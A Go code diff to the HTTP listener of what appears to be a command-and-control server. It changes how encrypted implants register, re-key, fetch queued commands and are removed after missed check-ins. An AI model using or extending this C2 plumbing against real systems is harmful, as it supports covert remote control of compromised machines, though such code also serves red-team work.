@@ -15,6 +15,7 @@ import (
 	"net/http"
 	"os"
 	"strconv"
+	"time"
 )
 
 type LS struct {
@@ -53,45 +54,52 @@ func ProcessRequest(c *gin.Context) {
 			NewImplant *Common.Implant
 			Registered bool
 		)
+		err = data_package.UnmarshalEncryptedMetaData(body)
+		if err != nil && err.Error() != "[error] insufficient data for package unmarshalling" {
+			log.Println("[error] attempting to unmarshal header", err)
+			c.JSON(http.StatusInternalServerError, "Internal Server Error")
+
+		}
+
+		decryptedPayload, AESKey, IV, err = Crypt.AESDecryptPayload(data_package, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
+		if err != nil {
+			log.Println("[error] attempting to decrypt payload")
+			c.JSON(http.StatusInternalServerError, "Internal Server Error")
+		}
 
 		//check if implant is already registered
 		for _, agent := range agent_arr {
 			if agent.Context.Agent_name == data_package.AgentName {
-				if agent.AESKey != nil && agent.IV != nil && agent.Context.User_name != "" {
+				if Common.CheckIfKeyIVIsEqual(agent.AESKey, agent.IV, AESKey, IV) {
 					log.Println("[info] implant already registered")
 					c.JSON(http.StatusOK, "")
 					Registered = true // if we're already registered, we don't need to do anything else
 					break
+				} else {
+					//agent is re-registering with a new key and IV
+					NewImplant = agent
+					NewImplant.Alive = true
+					log.Println("[info] implant re-registering with new key and IV")
 				}
 			}
 		}
+
 		if Registered {
-
 			break // break out of switch. We're already registered
-
 		} else { // if we're not registered, we need to register
-			err = data_package.UnmarshalEncryptedMetaData(body)
-			if err != nil && err.Error() != "[error] insufficient data for package unmarshalling" {
-				log.Println("[error] attempting to unmarshal header", err)
-				c.JSON(http.StatusInternalServerError, "Internal Server Error")
 
-			}
+			if NewImplant == nil {
+				NewImplant = &Common.Implant{
+					AESKey:  AESKey,
+					IV:      IV,
+					Alive:   true,
+					Context: Common.ImplantContext{},
+				}
+				//set the agent name before we add it to our array b/c it's part of the header package and not dedcrypted data.
+				NewImplant.Context.Agent_name = data_package.AgentName
 
-			decryptedPayload, AESKey, IV, err = Crypt.AESDecryptPayload(data_package, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
-			if err != nil {
-				log.Println("[error] attempting to decrypt payload")
-				c.JSON(http.StatusInternalServerError, "Internal Server Error")
+				agent_arr = append(agent_arr, NewImplant)
 			}
-			NewImplant = &Common.Implant{
-				AESKey:  AESKey,
-				IV:      IV,
-				Alive:   true,
-				Context: Common.ImplantContext{},
-			}
-			//set the agent name before we add it to our array b/c it's part of the header package and not dedcrypted data.
-			NewImplant.Context.Agent_name = data_package.AgentName
-
-			agent_arr = append(agent_arr, NewImplant)
 
 			go func() {
 				err = RegisterAgent(NewImplant, decryptedPayload)
@@ -101,6 +109,7 @@ func ProcessRequest(c *gin.Context) {
 			}()
 			break //CMD_Register
 		}
+
 	case Common.CMD_GET_JOB:
 		var (
 			AgentCmd Common.AgentCmd
@@ -114,7 +123,7 @@ func ProcessRequest(c *gin.Context) {
 			for _, agent := range agent_arr {
 				if agent.Context.Agent_name == data_package.AgentName {
 					agent.CmdQue.PreemptQueue(AgentCmd)
-
+					agent.LastCheckin = time.Now()
 				}
 			}
 
@@ -141,6 +150,7 @@ func ProcessRequest(c *gin.Context) {
 				AgentCmd.CmdID = Common.CMD_NO_JOB
 				AgentCmd.RequestID = data_package.RequestID + 1
 				c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
+				agent.LastCheckin = time.Now()
 
 			} else if (agent.Context.Agent_name == data_package.AgentName) && agent.CmdQue.Len() > 0 {
 
@@ -148,18 +158,16 @@ func ProcessRequest(c *gin.Context) {
 					value interface{}
 					ok    bool
 				)
-
+				agent.LastCheckin = time.Now()
 				value, err = agent.CmdQue.Dequeue()
 				if err != nil {
 					log.Println("[error] attempting to dequeue agent command", err)
 					c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
 				}
-
+				//TODO if there is multiple commands in the queue, we need to send them all
 				if AgentCmd, ok = value.(Common.AgentCmd); ok {
 					c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
-
 				} else {
-
 					log.Println("[error] attempting to cast value to AgentCmd")
 					c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
 				}
@@ -193,6 +201,21 @@ func (ls *LS) Start(token string) error {
 		if err != nil {
 			log.Println("[error] attempting to start event handler", err)
 			return
+		}
+	}()
+
+	go func() {
+		for {
+			if len(agent_arr) > 0 {
+				for i, agent := range agent_arr {
+					if !Common.CheckIfAgentIsAlive(agent, i) {
+						//TODO remove agent from agent_arr & send event to client.
+						log.Println("[info] removing agent [", agent.Context.Agent_name, "] index of [", i, "] from agent array")
+						agent_arr = append(agent_arr[:i], agent_arr[i+1:]...)
+					}
+				}
+			}
+			time.Sleep(5 * time.Second)
 		}
 	}()
 
